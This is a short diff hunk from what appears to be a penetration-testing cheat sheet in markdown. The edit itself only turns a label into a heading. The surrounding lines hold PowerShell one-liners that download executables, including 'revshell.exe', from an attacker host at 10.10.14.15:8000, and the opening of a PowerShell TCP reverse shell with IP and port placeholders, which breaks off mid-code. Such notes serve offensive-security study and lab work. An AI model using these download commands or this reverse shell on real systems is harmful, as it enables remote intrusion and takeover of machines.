@@ -82,7 +82,7 @@ powershell IWR -Uri http[:]//myip/filename.exe -OutFile filename.exe
 powershell "(new-object System.Net.WebClient).Downloadfile('http[:]//10.10.14.15:8000/revshell.exe', 'revshell.exe')"
 ```
 
-[Upgrading to powershell - Replace the placeholders with your local IP and PORT]
+### [Upgrading to powershell - Replace the placeholders with your local IP and PORT]
 ```
 $client​ = New-Object System.Net.Sockets.TCPClient(​ "<IPADDRESS>"​ ,<PORT>);​ $stream​ =
 $client​ .GetStream();[byte[]]​ $bytes​ = 0..65535|%{0};​ while​ ((​ $i​ = ​ $stream​ .Read(​ $bytes​ ,
